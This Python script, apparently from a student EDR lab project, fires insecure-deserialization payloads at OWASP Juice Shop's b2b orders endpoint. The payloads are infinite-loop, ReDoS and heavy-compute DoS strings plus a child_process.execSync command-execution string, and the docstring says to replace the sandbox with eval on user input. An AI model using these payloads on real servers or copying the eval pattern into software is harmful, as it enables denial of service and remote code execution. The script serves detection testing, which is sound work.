#!/usr/bin/env python3
"""
juiceshop_rce_test.py  -  RCE telemetry generator for OWASP Juice Shop
 
PURPOSE
    ICT30016 EDR project. Exercises Juice Shop's insecure-deserialization
    vulnerability (POST /b2b/v2/orders, `orderLinesData` field) to produce
    the telemetry the custom EDR is being built to detect.
 
SCOPE / AUTHORISATION
    For the isolated host-only lab only (Juice Shop VM + Kali attacker).
    Do not point this at anything you do not own and are not authorised
    to test.
 
HOW JUICE SHOP HANDLES THE PAYLOAD
    The `orderLinesData` string is evaluated server-side. In a DEFAULT
    Juice Shop it runs inside a vm sandbox (`safeEval`/`notevil`) with a
    ~2s timeout and iteration protection. So the built-in RCE challenges
    are CPU-occupation / DoS and stay INSIDE the sandbox: they do NOT
    spawn a child process, so auditd execve / Sysmon ProcessCreate will
    NOT fire on them. Their signature is the HTTP request + a node CPU
    stall + a timeout error in journald.
 
    To get node -> /bin/sh child-process telemetry (what the auditd +
    Sysmon layer is tuned for), the sandbox has to be removed in the lab
    copy of routes/b2bOrder.js (Juice Shop issue #571): replace
        vm.runInContext('safeEval(orderLinesData)', sandbox, {timeout:2000})
    with
        eval(orderLinesData)
    Only then does the `cmdexec` mode below actually exec under node.
 
USAGE
    python3 juiceshop_rce_test.py --target http://<juiceshop-vm-ip>:3000 --mode all
    python3 juiceshop_rce_test.py --target http://192.168.56.10:3000 --mode dos-loop
"""
 
import argparse
import json
import sys
import time
import uuid
 
try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")
 
# Unique marker for this run so events are easy to grep out of the logs.
RUN_ID = uuid.uuid4().hex[:8]
 
 
def register_and_login(base, email, password):
    """Register a throwaway account (ignore 'already exists'), then log in
    and return the JWT. Auth is required to reach /b2b/v2/orders."""
    s = requests.Session()
    s.verify = False
 
    # Registration is best-effort; a repeat run just reuses the account.
    try:
        s.post(
            f"{base}/api/Users",
            json={"email": email, "password": password, "passwordRepeat": password,
                  "securityQuestion": {"id": 1}, "securityAnswer": "edrlab"},
            timeout=10,
        )
    except requests.RequestException as e:
        print(f"[!] register call failed (continuing to login): {e}")
 
    r = s.post(f"{base}/rest/user/login",
               json={"email": email, "password": password}, timeout=10)
    if r.status_code != 200:
        sys.exit(f"[!] login failed ({r.status_code}): {r.text[:200]}")
 
    token = r.json().get("authentication", {}).get("token")
    if not token:
        sys.exit("[!] no token in login response")
    print(f"[+] authenticated as {email}")
    return s, token
 
 
def send_order(session, base, token, payload, label, telemetry):
    """POST one order with a crafted orderLinesData payload and report timing."""
    body = {
        "cid": f"EDRLAB-{RUN_ID}",
        "orderLines": [{"productId": 8, "quantity": 1, "customerReference": RUN_ID}],
        "orderLinesData": payload,
    }
    headers = {"Authorization": f"Bearer {token}",
               "Content-Type": "application/json"}
 
    print(f"\n=== {label} ===")
    print(f"    payload: {payload[:90]}{'...' if len(payload) > 90 else ''}")
    print(f"    expected telemetry: {telemetry}")
 
    t0 = time.perf_counter()
    try:
        r = session.post(f"{base}/b2b/v2/orders", headers=headers,
                         data=json.dumps(body), timeout=30)
        elapsed = time.perf_counter() - t0
        print(f"    -> HTTP {r.status_code} in {elapsed:.2f}s")
        # A stall at/above the ~2s sandbox timeout is the tell for the DoS payloads.
        if elapsed >= 1.9:
            print("    -> server was occupied ~>=2s (sandbox timeout / DoS signature)")
    except requests.RequestException as e:
        elapsed = time.perf_counter() - t0
        print(f"    -> request error after {elapsed:.2f}s: {e}")
 
 
# --- Payloads -------------------------------------------------------------
# The DoS payloads run inside the default sandbox (CPU/log telemetry only).
# cmdexec only execs if you've removed the sandbox in your lab copy (see header).
 
def payloads(mode):
    out = []
 
    if mode in ("dos-loop", "all"):
        # "Blocked RCE DoS" - infinite loop trips the iteration guard.
        out.append((
            "(function(){while(true){}})()",
            "Blocked RCE DoS (infinite loop)",
            "HTTP request in access log; node CPU stall; ~2s timeout error in journald. No execve.",
        ))
 
    if mode in ("redos", "all"):
        # ReDoS - catastrophic backtracking, ~503.
        out.append((
            "/((a+)+)b/.test('" + "a" * 40 + "!')",
            "ReDoS (catastrophic backtracking)",
            "HTTP request in access log; node CPU stall; likely 503. No execve.",
        ))
 
    if mode in ("dos-occupy", "all"):
        # "Successful RCE DoS" - occupy >2s without an infinite loop. Effectiveness
        # is OS/version dependent per the companion guide; tune the iteration count.
        out.append((
            "(function(){var h=require;var x='';for(var i=0;i<5e7;i++){x=''+i*i;}})()",
            "Successful RCE DoS (bounded heavy compute)",
            "HTTP request in access log; sustained node CPU; may 500. No execve. Tune loop size per host.",
        ))
 
    if mode in ("cmdexec", "all"):
        # UN-SANDBOXED LAB ONLY. Benign proof command -> real child process under node.
        # This is what lights up auditd execve + Sysmon ProcessCreate (ParentImage=node).
        out.append((
            f"require('child_process').execSync('id; touch /tmp/edr_rce_{RUN_ID}')",
            "Command exec (benign proof: id + marker file) [needs un-sandboxed b2bOrder.js]",
            f"execve under node -> ProcessCreate (Parent=node, child=/bin/sh 'id'); "
            f"webroot/file telemetry; marker /tmp/edr_rce_{RUN_ID}. Fails silently if sandbox intact.",
        ))
 
    return out
 
 
def main():
    ap = argparse.ArgumentParser(description="Juice Shop RCE telemetry generator (lab use only)")
    ap.add_argument("--target", required=True, help="Juice Shop base URL, e.g. http://192.168.56.10:3000")
    ap.add_argument("--mode", default="all",
                    choices=["dos-loop", "redos", "dos-occupy", "cmdexec", "all"],
                    help="which payload(s) to fire")
    ap.add_argument("--email", default=f"edrlab_{RUN_ID}@juice.sh")
    ap.add_argument("--password", default="EdrLab!2026")
    args = ap.parse_args()
 
    # Suppress the noisy TLS warning; lab is http on a host-only net anyway.
    requests.packages.urllib3.disable_warnings()
 
    base = args.target.rstrip("/")
    print(f"[*] run id: {RUN_ID}  (grep your logs for this string)")
    print(f"[*] target: {base}  mode: {args.mode}")
 
    session, token = register_and_login(base, args.email, args.password)
 
    for payload, label, telemetry in payloads(args.mode):
        send_order(session, base, token, payload, label, telemetry)
        time.sleep(1)  # space events out so they're distinguishable in the timeline
 
    print(f"\n[*] done. correlate with:")
    print(f"    sudo ausearch -k exec -ts recent | grep -i sh")
    print(f"    sudo journalctl -t sysmon --since '2 min ago' | grep -i eventid'>'1")
    print(f"    ls -la /tmp/edr_rce_{RUN_ID}   (cmdexec mode, un-sandboxed only)")
 
 
if __name__ == "__main__":
    main()
